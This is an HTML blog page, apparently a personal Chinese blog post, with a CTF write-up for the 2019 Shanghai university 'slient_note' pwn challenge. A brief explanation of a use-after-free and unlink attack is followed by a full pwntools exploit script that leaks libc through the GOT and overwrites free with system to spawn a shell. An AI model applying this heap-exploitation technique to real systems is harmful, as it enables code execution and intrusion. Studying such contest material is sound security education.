@@ -1,0 +1,211 @@
+<!DOCTYPE html>
+<html lang="en">
+<head><meta name="generator" content="Hexo 3.8.0">
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="google-site-verification" content="xBT4GhYoi5qRD5tr338pgPM5OWHHIDR6mNg1a3euekI">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="description" content>
+    <meta name="keyword" content>
+    <link rel="shortcut icon" href="/img/favicon.ico">
+
+    <title>
+        
+        2019上海市大学生网络安全大赛-slient_note - 萝卜
+        
+    </title>
+
+    <!-- Custom CSS -->
+    <link rel="stylesheet" href="/css/aircloud.css">
+    <link rel="stylesheet" href="/css/gitment.css">
+    <!--<link rel="stylesheet" href="https://imsun.github.io/gitment/style/default.css">-->
+    <link href="//at.alicdn.com/t/font_620856_pl6z7sid89qkt9.css" rel="stylesheet" type="text/css">
+    <!-- ga & ba script hoook -->
+    <script></script>
+</head>
+
+<body>
+
+<div class="site-nav-toggle" id="site-nav-toggle">
+    <button>
+        <span class="btn-bar"></span>
+        <span class="btn-bar"></span>
+        <span class="btn-bar"></span>
+    </button>
+</div>
+
+<div class="index-about">
+     你若盛开，清风自来！ 
+</div>
+
+<div class="index-container">
+    
+    <div class="index-left">
+        
+<div class="nav" id="nav">
+    <div class="avatar-name">
+        <div class="avatar radius">
+            <img src="/img/avatar.jpg">
+        </div>
+        <div class="name">
+            萝卜
+        </div>
+    </div>
+    <div class="contents" id="nav-content">
+        <ul>
+            <li>
+                <a href="/">
+                    <i class="iconfont icon-shouye1"></i>
+                    <span>HOME</span>
+                </a>
+            </li>
+            <li>
+                <a href="/tags">
+                    <i class="iconfont icon-biaoqian1"></i>
+                    <span>TAGS</span>
+                </a>
+            </li>
+            <li>
+                <a href="/archives">
+                    <i class="iconfont icon-guidang2"></i>
+                    <span>ARCHIVES</span>
+                </a>
+            </li>
+            <li>
+                <a href="/about/">
+                    <i class="iconfont icon-guanyu2"></i>
+                    <span>ABOUT</span>
+                </a>
+            </li>
+            
+            <li>
+                <a id="search">
+                    <i class="iconfont icon-sousuo1"></i>
+                    <span>SEARCH</span>
+                </a>
+            </li>
+            
+        </ul>
+    </div>
+    
+        <div id="toc" class="toc-article">
+    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#slient-note"><span class="toc-text">slient-note</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#做题思路"><span class="toc-text">做题思路</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#攻击流程"><span class="toc-text">攻击流程</span></a></li></ol></li></ol>
+</div>
+    
+</div>
+
+
+<div class="search-field" id="search-field">
+    <div class="search-container">
+        <div class="search-input">
+            <span id="esc-search"> <i class="icon-fanhui iconfont"></i></span>
+            <input id="search-input">
+            <span id="begin-search">search</span>
+        </div>
+        <div class="search-result-container" id="search-result-container">
+
+        </div>
+    </div>
+</div>
+
+        <div class="index-about-mobile">
+            <i> 你若盛开，清风自来！ </i>
+        </div>
+    </div>
+    
+    <div class="index-middle">
+        <!-- Main Content -->
+        
+
+
+<div class="post-container">
+    <div class="post-title">
+        2019上海市大学生网络安全大赛-slient_note
+    </div>
+
+    <div class="post-meta">
+        <span class="attr">Post：<span>2019-11-08 15:47:00</span></span>
+        
+        <span class="attr">Tags：/
+        
+        <a class="tag" href="/tags/#pwn" title="pwn">pwn</a>
+        <span>/</span>
+        
+        
+        </span>
+        <span class="attr">Visit：<span id="busuanzi_value_page_pv"></span>
+</span>
+
+    </div>
+    <div class="post-content no-indent">
+        <h2 id="slient-note"><a href="#slient-note" class="headerlink" title="slient-note"></a>slient-note</h2><p>emm，这道题题其实不难</p>
+<p>首先这道题没有开启PIE和RELRO</p>
+<p>漏洞点在<code>delete</code>中，存在UAF，但是<code>create</code>中限制我们只能创建大小<code>0x28</code>和<code>0x208</code>的<code>chunk</code></p>
+<h3 id="做题思路"><a href="#做题思路" class="headerlink" title="做题思路"></a>做题思路</h3><p>题目没有开启PIE，并且是和堆题，那么就应该想到<code>unlink attack</code>，emmmmm，我可能还是对<code>unlink attack</code>有点忘记，又复习一边<code>unlink attack</code>，回过头来再看一下这个题</p>
+<h3 id="攻击流程"><a href="#攻击流程" class="headerlink" title="攻击流程"></a>攻击流程</h3><ul>
+<li>构造unlink操作</li>
+<li>改写small和large</li>
+<li>修改free_got为system</li>
+<li>geshell</li>
+</ul>
+<p>构造<code>unlink</code>：首先我们要确定怎么<code>unlink</code>，如果释放0x28的<code>chunk</code>的话，不会<code>unlink</code>，所以我们只能来释放0x208的<code>chunk</code>的时候来触发<code>unlink</code></p>
+<p>当然，要触发<code>unlink</code>必须要使后一个<code>chunk</code>的<code>PREV_INUSE</code>位为0，但是程序中没有地方可以溢出，所以我们要想办法让前一个<code>chunk</code>成为<br>程序中读选项用的使<code>scanf</code>，所以我们可以通过它来触发调用<code>malloc_conslidate</code>，使堆块进入到<code>small bin</code>中，然后再<code>edit</code>，进行<code>unlink attack</code>即可</p>
+<p>Exp：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line">file_name = <span class="string">'./pwn'</span></span><br><span class="line">libc_name = <span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span></span><br><span class="line">ip = <span class="string">''</span></span><br><span class="line">prot = <span class="string">''</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    r = process(file_name)</span><br><span class="line">    libc = ELF(libc_name)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    r = remote(ip,int(prot))</span><br><span class="line">    libc = ELF(libc_name)</span><br><span class="line"></span><br><span class="line">file = ELF(file_name)</span><br><span class="line"></span><br><span class="line">sl = <span class="keyword">lambda</span> x : r.sendline(x)</span><br><span class="line">sd = <span class="keyword">lambda</span> x : r.send(x)</span><br><span class="line">sla = <span class="keyword">lambda</span> x,y : r.sendlineafter(x,y)</span><br><span class="line">rud = <span class="keyword">lambda</span> x : r.recvuntil(x,drop=<span class="literal">True</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> x : r.recvuntil(x)</span><br><span class="line">li = <span class="keyword">lambda</span> name,x : log.info(name+<span class="string">':'</span>+hex(x))</span><br><span class="line">ri = <span class="keyword">lambda</span>  : r.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span><span class="params">(sign,value)</span>:</span></span><br><span class="line">    ru(<span class="string">'4.Exit\n'</span>)</span><br><span class="line">    sl(<span class="string">'1'</span>)</span><br><span class="line">    ru(<span class="string">'2.Large\n'</span>)</span><br><span class="line">    sl(str(sign))</span><br><span class="line">    ru(<span class="string">'Content:\n'</span>)</span><br><span class="line">    sl(value)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(index)</span>:</span></span><br><span class="line">    ru(<span class="string">'4.Exit\n'</span>)</span><br><span class="line">    sl(<span class="string">'2'</span>)</span><br><span class="line">    ru(<span class="string">'2.Large\n'</span>)</span><br><span class="line">    sl(str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(sign,value)</span>:</span></span><br><span class="line">    ru(<span class="string">'4.Exit\n'</span>)</span><br><span class="line">    sl(<span class="string">'3'</span>)</span><br><span class="line">    ru(<span class="string">'2.Large\n'</span>)</span><br><span class="line">    sl(str(sign))</span><br><span class="line">    ru(<span class="string">'Content:'</span>)</span><br><span class="line">    sl(value)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">target_malloc_conslidate</span><span class="params">()</span>:</span></span><br><span class="line">	ru(<span class="string">'4.Exit\n'</span>)</span><br><span class="line">	sl(<span class="string">"1"</span>*<span class="number">0x500</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">()</span>:</span></span><br><span class="line">    gdb.attach(r)</span><br><span class="line">    raw_input()</span><br><span class="line"></span><br><span class="line">create(<span class="number">1</span>,<span class="string">"\x00"</span>)</span><br><span class="line">create(<span class="number">2</span>,<span class="string">"\x11"</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">target_malloc_conslidate()</span><br><span class="line">target_addr= <span class="number">0x6020D0</span></span><br><span class="line">fd=target_addr - <span class="number">0x18</span></span><br><span class="line">bk=target_addr - <span class="number">0x10</span></span><br><span class="line">fake_chunk=<span class="string">'a'</span>*<span class="number">0x8</span> <span class="comment"># prev_size</span></span><br><span class="line">fake_chunk+=p64(<span class="number">0x21</span>) <span class="comment"># size</span></span><br><span class="line">fake_chunk+=p64(fd)+p64(bk)</span><br><span class="line">fake_chunk += p64(<span class="number">0x20</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>,fake_chunk)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">puts_plt = file.plt[<span class="string">'puts'</span>]</span><br><span class="line">free_got = file.got[<span class="string">'free'</span>]</span><br><span class="line">puts_got = file.got[<span class="string">'puts'</span>]</span><br><span class="line">fake_addr = <span class="number">0x6020D0</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>,p64(<span class="number">0</span>)*<span class="number">3</span>+p64(fake_addr)+p64(free_got))</span><br><span class="line">edit(<span class="number">2</span>,p64(puts_plt))</span><br><span class="line">edit(<span class="number">1</span>,p64(fake_addr)+p64(puts_got))</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">data = rud(<span class="string">"3.Update\n"</span>)</span><br><span class="line">libc_base = u64(data[:<span class="number">6</span>]+<span class="string">"\x00\x00"</span>)-libc.symbols[<span class="string">'puts'</span>]</span><br><span class="line">li(<span class="string">"libc_base"</span>,libc_base)</span><br><span class="line">system = libc.symbols[<span class="string">'system'</span>]+libc_base</span><br><span class="line">edit(<span class="number">1</span>,p64(fake_addr)+p64(free_got))</span><br><span class="line">edit(<span class="number">2</span>,p64(system))</span><br><span class="line">edit(<span class="number">1</span>,<span class="string">"/bin/sh\x00"</span>+p64(<span class="number">0x6020D0</span>))</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line">ri()</span><br></pre></td></tr></table></figure></p>
+
+        
+        <br>
+        <div id="comment-container">
+        </div>
+        <div id="disqus_thread"></div>
+
+        <div id="lv-container">
+        </div>
+
+    </div>
+</div>
+
+    </div>
+</div>
+
+
+<footer class="footer">
+    <ul class="list-inline text-center">
+        
+        
+
+        
+
+        
+
+        
+
+        
+
+    </ul>
+    
+    <p>
+        <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+        转发请备注<a href="“https://luobuming.github.io”">一筐萝卜</a>的个人博客 <br>
+        本站总访问量<span id="busuanzi_value_site_pv"></span>次
+       </p>
+</footer>
+
+
+
+
+</body>
+
+<script>
+    // We expose some of the variables needed by the front end
+    window.hexo_search_path = "search.json"
+    window.hexo_root = "/"
+    window.isPost = true
+</script>
+<script src="https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script>
+<script src="/js/index.js"></script>
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+</html>
